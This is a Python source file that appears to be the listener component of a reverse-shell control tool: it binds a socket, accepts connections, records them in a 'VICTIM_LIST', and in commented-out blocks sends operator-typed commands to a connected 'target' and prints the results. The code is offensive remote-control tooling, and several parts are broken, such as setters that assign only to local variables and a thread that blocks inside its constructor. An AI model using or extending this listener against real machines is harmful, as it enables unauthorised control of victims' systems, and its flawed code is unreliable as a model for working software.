import settings
import threading
from queue import Queue
import socketserver
import socket
from _thread import *
import time
import sys

class Listener_Thread(threading.Thread):
    def __init__(self, queue, conn, addr, args=(), kwargs=None):
        threading.Thread.__init__(self, args=(), kwargs=None)
        self.queue = queue
        self.daemon = True
        self.accept_connections(conn, addr)

    def accept_connections(self, conn, addr):
        for c in settings.ALL_CONNECTIONS:
            c.close()
        del settings.ALL_CONNECTIONS[:]
        del settings.ALL_CONNECTIONS[:]
    
        while 1:
            ans = conn.recv(1024).decode()
            sys.stdout.write(ans)
            settings.ALL_CONNECTIONS.append(conn)
            settings.ALL_ADDRESSES.append(addr)
        
            for ips in settings.VICTIM_LIST:
                if ips['IP'] != addr:
                    settings.VICTIM_LIST[settings.VICTIM_CTR]['IP'] = addr
                    settings.VICTIM_LIST[settings.VICTIM_CTR]['CONNECTION'] = conn
                    settings.VICTIM_LIST[settings.VICTIM_CTR]['ID'] = settings.VICTIM_CTR + 1
                    settings.VICTIM_CTR += 1
                
        
        



def create_server(ip, port):
    # Create listener
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((str(ip), int(port)))
    s.listen(1)
    conn, addr = s.accept()
    conn.setblocking(1)

    q = Queue()
    settings.ALL_CONNECTIONS.append(Listener_Thread(q, conn, addr))
    settings.ALL_CONNECTIONS[settings.VICTIM_CTR].start()
    


def listen(ip, port):
    #Create Thread to start server
    th = threading.Thread(target=create_server, args=(str(ip), int(port)))
    th.daemon = True
    th.start()


   
'''
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])
'''



'''

Code save

    print('Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()
        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)
        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

'''


def set_lhost(var, value):
    var = str(value)

def set_lport(var, value):
    var = int(value)

